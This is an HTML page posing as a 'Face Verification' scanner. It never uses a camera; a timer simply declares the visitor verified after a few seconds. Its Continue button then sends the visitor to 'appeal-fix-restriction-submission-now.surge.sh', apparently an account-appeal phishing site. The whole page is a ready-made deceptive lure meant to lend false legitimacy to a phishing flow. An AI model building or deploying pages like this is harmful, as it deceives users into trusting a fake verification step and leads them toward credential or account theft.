<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Face Verification</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #0f172a, #1e2937);
            font-family: 'Segoe UI', Roboto, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(12px);
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
            text-align: center;
            max-width: 420px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .scanner-ring {
            width: 200px;
            height: 200px;
            border-radius: 50%;
            background: conic-gradient(#22d3ee, #06b67f, #eab308, #f97316, #22d3ee);
            animation: spin 2s linear infinite;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            box-shadow: 0 0 40px rgba(34, 211, 238, 0.5);
        }
        .scanner-core {
            width: 140px;
            height: 140px;
            background: #1e2937;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 62px;
            border: 6px solid #22d3ee;
            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.6);
        }
        .scanner-complete {
            animation: none;
            background: linear-gradient(135deg, #10b981, #34d399);
            border: 6px solid #10b981;
            box-shadow: 0 0 30px #10b981;
        }
        .face-frame {
            position: absolute;
            width: 110px;
            height: 130px;
            border: 3px solid rgba(255,255,255,0.6);
            border-radius: 50% 50% 45% 45%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .status-message {
            font-size: 20px;
            margin-bottom: 12px;
            font-weight: 500;
        }
        .verified-message {
            display: none;
            font-size: 24px;
            font-weight: 700;
            color: #34d399;
            margin: 15px 0;
        }
        .sub-text {
            display: none;
            font-size: 15.5px;
            color: #94a3b8;
            margin-bottom: 25px;
        }
        .continue-button {
            display: none;
            margin-top: 10px;
            padding: 15px 40px;
            background: linear-gradient(90deg, #22d3ee, #06b67f);
            color: #0f172a;
            font-size: 17px;
            font-weight: 700;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 25px rgba(34, 211, 238, 0.4);
        }
        .continue-button:hover {
            transform: scale(1.05);
            box-shadow: 0 12px 30px rgba(34, 211, 238, 0.5);
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="scanner-ring" id="scannerRing">
            <div class="face-frame"></div>
            <div class="scanner-core" id="scannerCore">👤</div>
        </div>
        
        <div class="status-message" id="statusText">Scanning your face securely...</div>
        <div class="verified-message" id="verifiedText">✅ Face Verified Successfully</div>
        <div class="sub-text" id="subText">You have been identified as a real person.</div>
        
        <button class="continue-button" id="continueBtn">Continue</button>
    </div>

    <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-confirmation-tone-2867.mp3" preload="auto"></audio>

    <script>
        const redirectURL = "https://appeal-fix-restriction-submission-now.surge.sh/"; // Change this to your desired page

        setTimeout(() => {
            document.getElementById("successSound").play().catch(() => {});

            const ring = document.getElementById("scannerRing");
            const core = document.getElementById("scannerCore");

            ring.classList.add("scanner-complete");
            core.textContent = "✅";
            core.style.fontSize = "72px";

            document.getElementById("statusText").style.display = "none";
            document.getElementById("verifiedText").style.display = "block";
            document.getElementById("subText").style.display = "block";
            document.getElementById("continueBtn").style.display = "inline-block";
        }, 3400);

        document.getElementById("continueBtn").addEventListener("click", () => {
            window.location.href = redirectURL;
        });
    </script>
</body>
</html>
